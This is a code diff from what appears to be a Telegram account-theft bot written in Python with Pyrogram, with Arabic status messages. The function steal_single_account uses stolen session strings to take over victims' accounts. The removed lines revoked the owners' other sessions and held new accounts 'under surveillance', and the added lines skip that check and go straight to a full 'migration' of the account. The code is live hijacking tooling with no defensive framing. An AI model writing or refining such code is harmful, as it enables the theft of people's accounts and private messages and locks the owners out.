@@ -1372,8 +1372,6 @@ def handle_steal(call):
 
 
 
-
-
 async def steal_single_account(acc_id, admin_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الحساب غير موجود."
@@ -1381,34 +1379,16 @@ async def steal_single_account(acc_id, admin_id):
 
     client_a = Client(f"st_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
     try:
-        await asyncio.wait_for(client_a.connect(), timeout=12)
-        auths = await client_a.invoke(functions.account.GetAuthorizations())
-        wait_error = False
+        # نستدعي دالة السحب والتهجير مباشرة دون أي فحص للـ 24 ساعة
+        success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
+        
+        if success: 
+            return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
+        else: 
+            return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
 
-        for auth in auths.authorizations:
-            if not getattr(auth, 'current', False):
-                try:
-                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                    await asyncio.sleep(0.4)
-                except Exception as e:
-                    if "fresh" in str(e).lower() or "24" in str(e).lower():
-                        wait_error = True
-                        break
-
-        if wait_error:
-            conn = get_db_conn()
-            c = conn.cursor()
-            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
-            conn.commit()
-            conn.close()
-            return f"⏳ `{phone}` جـديـد! تـم وضـعـه تـحـت نـظـام الـمـراقـبـة، سـيـتـم سـحـبـه تـلـقـائـيـاً عـنـد جـهـوزيـتـه."
-
-        else:
-            success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
-            if success: return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
-            else: return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
-
-    except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
+    except Exception as e: 
+        return f"❌ فشل الاتصال بالحساب `{phone}`."
     finally:
         if client_a.is_connected: await client_a.disconnect()
 
